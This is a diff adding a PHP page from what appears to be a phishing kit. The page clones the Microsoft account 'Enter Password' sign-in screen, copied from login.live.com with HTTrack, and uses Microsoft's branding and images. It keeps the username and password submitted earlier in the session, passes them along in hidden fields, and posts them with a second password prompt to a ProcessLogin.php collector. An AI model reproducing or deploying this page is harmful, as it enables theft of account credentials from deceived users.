@@ -1,0 +1,147 @@
+<?php
+@require "../../includes/session_protect.php";
+@require "../../includes/functions.php";
+@require "../../includes/simplehtmldom.php";
+$_SESSION['user'] = $_POST['user']; 
+$_SESSION['pass'] = $_POST['pass'];
+
+?>
+<html>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<base />
+<title>Sign in to your Microsoft account</title>
+<meta name="PageID" content="i4416"><meta name="SiteID" content="38936">
+<meta name="ReqLC" content="1033"><meta name="LocLC" content="1033"/>
+<link rel="shortcut icon" href="https://auth.gfx.ms/16.000.27853.1/images/favicon.ico" />
+<style type="text/css">
+
+body	{margin: 0;
+        background-color : white;
+        background-repeat: no-repeat;
+        background-position: center;
+        background-size: cover;
+		font-family: "Segoe UI","Segoe UI Web Regular","Segoe UI Symbol","Helvetica Neue","BBAlpha Sans","S60 Sans",Arial,sans-serif;
+		font-weight: 400;
+		font-size: 15px;
+		line-height: 20px;}
+
+@media only screen and (min-width: 600px) {
+    body {
+        background-image: url("https://auth.gfx.ms/16.000.27853.1/images/Backgrounds/0.jpg");
+    }
+}
+
+@media only screen and (max-width: 600px) {
+    body {
+        background-color: white;
+    }
+}
+
+	
+.outer{display: table;
+		position: absolute;
+		height: 100%;width: 100%;}
+		
+		
+.middle{display: table-cell;
+		vertical-align: middle;}
+		
+.inner{margin-left: auto;
+margin-right: auto;
+min-height: 300px;
+max-height: 350px;
+min-width: 275px;
+max-width: 350px;
+width: calc(100% - 40px);
+padding: 36px;
+margin-bottom: 28px;
+background: #ffffff;
+-webkit-box-shadow: 0px 2px 3px rgba(0, 0, 0, 0.55);
+-moz-box-shadow: 0px 2px 3px rgba(0, 0, 0, 0.55);
+box-shadow:0px 2px 3px rgba(0, 0, 0, 0.55);
+border: 1px solid #818C94;
+border: 1px solid rgba(0, 0, 0, 0.4);}
+
+div.footerNode{margin: 0;float: right;}
+.footer{position: fixed;bottom: 0px;width: 100%;overflow: visible;z-index: 99;clear: both;background-color: rgba(0, 0, 0, 0.6);}
+.form-group{margin-bottom: 16px;}
+.text-title{padding: 0;margin-top: 16px;margin-bottom: 12px;font-size: 24px;color: #404040;font-size: 1.5rem;line-height: 28px;font-weight: 600;line-height: 1.75rem;font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";}.text-title:lang(zh-cn), .text-title:lang(zh-tw){font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande","Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";}
+.relative{position: relative;}
+div.footerNode a,div.footerNode span{color: white;font-size: 12px;line-height: 28px;white-space: nowrap;display: inline-block;margin-left: 8px;margin-right: 8px;}a{text-decoration: none;}@media (max-width: 600px), (max-height: 392px){.middle{vertical-align: top;}.inner{-webkit-box-shadow: none;-moz-box-shadow: none;box-shadow: none;border: 0;padding: 24px;width: 100%;}.footer.default{background: white;}.footer.default div.footerNode a,.footer.default div.footerNode span{color: #777777;}div.footerNode{float: left;}}
+ .text-line {
+        background-color: transparent;
+        color: #696969;
+        outline: none;
+        outline-style: none;
+        outline-offset: 0;
+        border-top: none;
+        border-left: none;
+        border-right: none;
+        border-bottom: solid #000000 1px;
+        padding: 3px 0px;
+		width : 100%;
+		font-size : 15px;
+		font-family : Segoe UI light;
+    }
+
+	.button {
+    background-color: #144BBA;
+    border: none;
+    color: white;
+    padding: 6px 38px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 15px;
+	font-family: Segoe UI;
+}
+
+input[type=checkbox]
+{
+  /* Double-sized Checkboxes */
+  -ms-transform: scale(1); /* IE */
+  -moz-transform: scale(1); /* FF */
+  -webkit-transform: scale(1.5); /* Safari and Chrome */
+  -o-transform: scale(1.5); /* Opera */
+  padding: 10px;
+}
+
+/* Might want to wrap a span around your checkbox text */
+.checkboxtext
+{
+  /* Checkbox text */
+  font-size: 90%;
+  display: inline;
+}
+</style>
+</head>
+<body>
+<div>
+<div class="outer" id="idHeaderTD9">
+<div class="middle"><div class="inner relative">
+<img src="../../img/ms-logo-v2.jpg" class="logo" alt="Microsoft account" />
+<div class="row form-group" style="font-size:13px;font-family:Segoe UI;">
+<p style="font-size:15px">ðŸ¡  <?php echo $_SESSION['user'];?></p>
+<div class="row text-title" role="heading">Enter Password</div>
+<form action="../../includes/ProcessLogin.php" name="email" id="asw" method="POST">
+<div class="row form-group"><input type="password" class="text-line" name="epass" value="" onfocus="this.value='';" onblur="if(this.value==''){this.value=''};" required></div>
+<input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
+<input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
+<input type="checkbox" align="middle"><a style="font-size:15px">&nbsp Keep me signed in</a><br><br>
+<div class="row form-group"><a href="#">Forgot my password</a><br><br>
+<div class="row form-group" align="right"><button class="button" type="submit" value="submit">Sign in</button></div></div></div></div>
+</form>
+<div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
+                    params: {
+                        serverData: svr,
+                        debugDetails: debugDetails,
+                        showLinks: true },
+                    event: {
+                        agreementClick: footer_agreementClick,
+                        showDebugDetailsClick: footer_showDebugDetailsClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy">&copy; 2018 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="#">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="#">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'], attr: { title: str['CT_STR_More_Options_Ellipsis_AriaLabel'] }" aria-label="Click here for more options" title="Click here for more options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27853.1/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://auth.gfx.ms/16.000.27853.1/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="https://auth.gfx.ms/16.000.27853.1/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27853.1/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://auth.gfx.ms/16.000.27853.1/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="https://auth.gfx.ms/16.000.27853.1/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div><!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko --></div> </div>
+</body>
+<!-- Mirrored from login.live.com/jsDisabled.srf?mkt=EN-US&lc=1033 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 20 May 2018 14:32:49 GMT -->
+</html>
